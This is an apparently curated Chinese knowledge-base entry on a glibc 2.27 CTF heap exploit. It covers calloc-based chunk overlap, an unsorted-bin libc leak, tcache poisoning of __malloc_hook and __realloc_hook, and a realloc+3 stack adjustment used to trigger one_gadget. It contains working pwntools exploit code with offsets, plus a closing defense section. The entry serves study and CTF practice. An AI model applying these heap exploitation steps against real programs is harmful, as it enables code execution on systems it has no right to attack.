---
id: binary-pwn-heap-calloc-tcache-overlap-realloc-hook-onegadget
title: calloc 堆题：改相邻 chunk size 造重叠泄露 libc，tcache poisoning 覆写 __malloc_hook/__realloc_hook 并用 realloc+3 调栈帧打 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: calloc-tcache-overlap-malloc-realloc-hook-stack-onegadget
aliases:
- realloc+3 调栈帧
- __realloc_hook 调整栈帧
- __malloc_hook one_gadget
- calloc 不消费 tcache
- tcache poisoning 打 hook
- babyheap 2017 tcache 版本
tags:
- pwn
- heap
- tcache
- calloc
- malloc-hook
- realloc-hook
- one-gadget
- glibc-2.27
- stack-frame
- ctf
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:42:34+08:00'
  notes: 已对照原文与 1 张图核对：calloc 不消费 tcache、0x10 越界改相邻 0x70 size=0x191、8 次 add(0x180) 填满 0x190 tcache、unsorted 泄露减 0x3ebca0、tcache poisoning 到 __malloc_hook-0x23、realloc+3 调栈帧均一致；已修正 hook 写入顺序为 __realloc_hook=one_gadget、__malloc_hook=realloc+3（原文 payload 先 ogg 后 realloc+3，__realloc_hook 在 __malloc_hook 低 8 字节）；原文 exp 无成功回显，未本机复跑。
---

## 一句话结论

在 add 用 `calloc` 的堆题里，编辑函数接受用户自报长度可溢出相邻 chunk 的 size 字段；把目标 chunk 放大后释放，并用 7 个同尺寸块先填满 tcache，可让目标块落入 unsorted bin 泄露 libc，再通过 tcache poisoning 把分配引到 `__malloc_hook`，写入 one_gadget 与 `realloc+3`，利用 `realloc+3` 多出的一层调用帧调整 `rsp`，使原本不满足约束的 one_gadget 成立。

## 原理

- **可控长度的编辑造成堆溢出**：`edit(index)` 让用户再输入一个 `size`，程序按该 `size` 从用户指针开始 `read`，不校验它是否超过 `calloc` 时的分配大小。因此对 0x10 的块写入 0x20 字节即可覆盖下一个 chunk 的 `prev_size` 与 `size`，把相邻 0x70 块的 size 改成 0x191。
- **放大后释放得到大块**：size 被改大后，`free` 该块会按伪造的 0x190 大小把它链入 bin；后续按 0x180 分配时就能拿到覆盖原相邻块的大 chunk，形成 chunk 重叠/指针别名，为泄露与后续写打基础。
- **calloc 与 tcache 的关键差异**：`calloc` 不会从 tcache 取块（只走 fastbin/unsorted/small/large/top）。因此想让某个尺寸的块进入 unsorted bin 并被 `calloc` 重新拿到，必须先用 7 个同尺寸 `free` 填满该 tcache bin；第 8 个同尺寸块才会进入 unsorted bin。原文正是先 `add(0x180)` 八次并释放，使其中一个 0x190 块留在 unsorted bin。
- **unsorted bin 泄露 libc**：unsorted bin 中的空闲块 `fd/bk` 指向 `main_arena` 附近（如 `main_arena+96`），通过重叠指针 `show` 读出该指针，减去 libc 中对应偏移（原文 0x3ebca0）即得 libc 基址。
- **tcache poisoning 打 hook**：释放一个可控 fd 的 tcache 块，把 `fd` 改成 `__malloc_hook - 0x23`（该偏移处有可用的 `0x7f` 假 size，且使返回的用户指针落到 hook 附近），连续两次同尺寸分配，第二次就会返回 hook 区域的“chunk”，从而可写 `__malloc_hook` 与相邻的 `__realloc_hook`（在 glibc 2.27 中 `__realloc_hook` 位于 `__malloc_hook` 低 8 字节）。
- **realloc+3 调栈帧**：把 `__malloc_hook` 写成 `realloc+3`、`__realloc_hook` 写成 one_gadget（跳过 realloc 函数头部的部分 push/栈帧建立）。触发分配时，`malloc` 先调用 `__malloc_hook = realloc+3` 进入 realloc 函数体，realloc 再调用 `__realloc_hook = one_gadget`；这条链多出/改变一层 realloc 调用帧，`rsp` 相对直接调用 one_gadget 下移一个函数帧，使 one_gadget 要求的 `rsp & 0xf == 0`、`rsp+0x40/0x70` 可写、argv 形状等约束更容易满足；前提是目标 glibc 仍保留 `__malloc_hook/__realloc_hook`（≤2.33）。
- **最终危害**：one_gadget 执行 `execve("/bin/sh", ...)` 获得 shell，完成从堆溢出到代码执行的完整利用。

## 触发条件

- glibc 2.27（或 2.23–2.33）且保留 `__malloc_hook`/`__realloc_hook`；目标程序 add 使用 `calloc`。
- 编辑/读取函数接受用户自报长度且不校验分配大小，能覆盖相邻 chunk 头。
- 程序有 show/打印功能，可读出重叠块中的 unsorted bin 指针。
- 能进行同尺寸多次分配与释放（满足 7 个 tcache 填充），并有稳定的堆布局。
- 已知 libc 版本/偏移，或可先泄露 libc；one_gadget 约束需要 `rsp` 调整。

## 利用步骤

1. 逆向下发 add/edit/delete/show 的索引与大小处理，确认 `edit` 的长度参数用户可控；确认 `add` 使用 `calloc`。
2. 布局：`add(0x10)`、`add(0x70)`、`add(0x90)`、`add(0x60)`，再 `add(0x60)` 七次并释放，填满 0x70 的 tcache。
3. 用 0x10 块的越界写覆盖相邻 0x70 块的 size：`b'a'*0x10 + p64(0) + p64(0x191)`。
4. 连续 `add(0x180)` 八次并全部释放，使 0x190 尺寸的 tcache 被填满、一个块进入 unsorted bin；再释放被放大的块并把 0x70 块申请回来，制造与 unsorted bin 块重叠的指针。
5. `show` 重叠指针对应索引，读取 `main_arena` 指针，算 `libc_base = leak - 0x3ebca0`。
6. 释放一个可控的 tcache 块，`edit` 其 `fd` 为 `__malloc_hook - 0x23`；连续两次同尺寸 `add`，第二次拿到 hook 区域。
7. 在 hook 区域写 `p64(one_gadget)` 到 `__realloc_hook`、`p64(libc.sym['realloc'] + 3)` 到 `__malloc_hook`（两者相邻，一次写入即可；`__realloc_hook` 在 `__malloc_hook` 低 8 字节）。
8. 触发一次分配/释放，执行 one_gadget 拿 shell；若约束不满足，换 one_gadget 偏移或改用 `__free_hook = system` + `free("/bin/sh")`。

## PoC

原文 exp 的关键骨架（地址/索引按原题，未在本机复跑，原文未附成功回显）：

```python
from pwn import *
libc = ELF('./libc.so.6')

def poison_and_hooks(libc_base):
    one_gadget = libc_base + [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc][0]
    malloc_hook = libc.sym['__malloc_hook'] + libc_base
    realloc_hook = libc.sym['__realloc_hook'] + libc_base
    realloc = libc.sym['realloc'] + libc_base + 3

    add(0x90); add(0x60); delete(5)
    edit(3, p64(malloc_hook - 0x23))   # tcache fd 指向 hook 附近
    add(0x60); add(0x60)               # 第二次分配返回 hook 区域
    edit(6, b'a' * (0x13 - 8) + p64(one_gadget) + p64(realloc))
    delete(0)
    sl(str(1))                         # 再次分配，触发 hook
```

布局与泄露部分：

```python
add(0x10); add(0x70); add(0x90); add(0x60)
for _ in range(7): add(0x60)
for i in range(7): delete(i + 4)
edit(0, b'a' * 0x10 + p64(0) + p64(0x191))   # 改相邻 chunk size
for _ in range(8): add(0x180)
for i in range(8): delete(i + 4)
delete(1)
add(0x70)
show(2)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3ebca0
```

## 变体与关联

- 变体：不调 `rsp` 时可直接把 `__free_hook` 写成 `system`，再 `free("/bin/sh")`；原文 exp 中也保留了这条 `__free_hook + system` 的分支。
- 变体：若 `__malloc_hook` 附近没有合适的假 size，可改用 `__free_hook`、`_IO_list_all`、`exit_funcs` 等可写目标。
- 变体：tcache 有 key/safe-linking 的更高版本需要先清 key 或泄露 heap 地址；glibc ≥2.34 移除 hooks 后应改用 FSOP/`setcontext`/栈 ROP。
- 关联：[[binary-pwn-heap-house-of-botcake-tcache-poison]]（填满 tcache + unsorted bin 合并绕 double free）、[[binary-pwn-heap-note-offbyone-unlink-house-of-some-iofile]]（off-by-one 改 size 与重叠）、[[binary-pwn-format-string-malloc-hook-one-gadget]]（另一种写 `__malloc_hook` 为 one_gadget 的原语）、[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（新版本 tcache 的对应打法）。

## 检测与防御

- **修复根因**：`edit` 必须以 `calloc` 时记录的大小为上限，不能信任用户再次输入的长度；对索引、长度做双重校验。
- **加固**：升级 glibc ≥2.34 移除 malloc/free hooks；开启 tcache key/safe-linking；使用 hardened allocator、Full RELRO、PIE、Canary。
- **分配器策略**：业务代码避免 `calloc`/`malloc` 混用导致的 bin 行为差异被利用；对关键对象使用独立 arena 或隔离分配器。
- **检测**：异常的 `edit` 长度远大于分配大小、chunk size 字段被改写、`free` 后 `fd` 指向 libc 数据段、分配返回地址落在 `__malloc_hook` 附近；崩溃现场出现 `realloc+3` 返回地址与 one_gadget 执行。
